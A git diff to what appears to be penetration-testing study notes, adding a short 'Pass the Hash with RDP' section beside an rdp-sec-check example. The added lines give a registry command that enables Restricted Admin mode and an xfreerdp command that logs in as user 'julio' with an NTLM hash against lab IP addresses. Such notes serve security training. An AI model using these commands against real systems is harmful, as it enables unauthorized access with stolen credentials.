@@ -782,7 +782,14 @@ $ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-c
 $ ./rdp-sec-check.pl 10.129.201.248
 ```
 
-
+### Pass the Hash with RDP
+Adding the DisableRestrictedAdmin Registry Key
+```shell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+```shell
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
 
 ### Service Interaction
 - xfreerdp
